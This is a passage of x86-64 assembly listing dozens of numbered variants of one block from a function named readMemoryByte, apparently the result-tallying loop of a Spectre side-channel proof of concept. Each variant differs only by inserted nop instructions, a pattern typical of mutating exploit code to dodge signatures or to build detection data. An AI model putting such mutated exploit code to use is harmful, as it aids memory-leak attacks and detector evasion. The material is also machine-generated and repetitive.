	jmp	.LreadMemoryByte_win2_continue
## Variant 32
.LreadMemoryByte_win2_var32:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 33
.LreadMemoryByte_win2_var33:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 34
.LreadMemoryByte_win2_var34:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 35
.LreadMemoryByte_win2_var35:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 36
.LreadMemoryByte_win2_var36:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 37
.LreadMemoryByte_win2_var37:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 38
.LreadMemoryByte_win2_var38:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 39
.LreadMemoryByte_win2_var39:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 40
.LreadMemoryByte_win2_var40:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 41
.LreadMemoryByte_win2_var41:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 42
.LreadMemoryByte_win2_var42:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 43
.LreadMemoryByte_win2_var43:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 44
.LreadMemoryByte_win2_var44:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 45
.LreadMemoryByte_win2_var45:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 46
.LreadMemoryByte_win2_var46:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 47
.LreadMemoryByte_win2_var47:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 48
.LreadMemoryByte_win2_var48:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 49
.LreadMemoryByte_win2_var49:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 50
.LreadMemoryByte_win2_var50:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 51
.LreadMemoryByte_win2_var51:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 52
.LreadMemoryByte_win2_var52:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 53
.LreadMemoryByte_win2_var53:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 54
.LreadMemoryByte_win2_var54:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 55
.LreadMemoryByte_win2_var55:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 56
.LreadMemoryByte_win2_var56:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 57
.LreadMemoryByte_win2_var57:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 58
.LreadMemoryByte_win2_var58:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 59
.LreadMemoryByte_win2_var59:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 60
.LreadMemoryByte_win2_var60:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 61
.LreadMemoryByte_win2_var61:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 62
.LreadMemoryByte_win2_var62:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 63
.LreadMemoryByte_win2_var63:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 64
.LreadMemoryByte_win2_var64:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 65
.LreadMemoryByte_win2_var65:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 66
.LreadMemoryByte_win2_var66:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 67
.LreadMemoryByte_win2_var67:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 68
.LreadMemoryByte_win2_var68:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 69
.LreadMemoryByte_win2_var69:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 70
.LreadMemoryByte_win2_var70:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 71
.LreadMemoryByte_win2_var71:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 72
.LreadMemoryByte_win2_var72:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 73
.LreadMemoryByte_win2_var73:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 74
.LreadMemoryByte_win2_var74:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 75
.LreadMemoryByte_win2_var75:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 76
.LreadMemoryByte_win2_var76:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 77
.LreadMemoryByte_win2_var77:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 78
.LreadMemoryByte_win2_var78:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 79
.LreadMemoryByte_win2_var79:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 80
.LreadMemoryByte_win2_var80:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 81
.LreadMemoryByte_win2_var81:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 82
.LreadMemoryByte_win2_var82:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 83
.LreadMemoryByte_win2_var83:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 84
.LreadMemoryByte_win2_var84:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 85
.LreadMemoryByte_win2_var85:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 86
.LreadMemoryByte_win2_var86:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 87
.LreadMemoryByte_win2_var87:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 88
.LreadMemoryByte_win2_var88:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 89
.LreadMemoryByte_win2_var89:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 90
.LreadMemoryByte_win2_var90:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 91
.LreadMemoryByte_win2_var91:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 92
.LreadMemoryByte_win2_var92:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 93
.LreadMemoryByte_win2_var93:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 94
.LreadMemoryByte_win2_var94:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 95
.LreadMemoryByte_win2_var95:
	popq	%rax
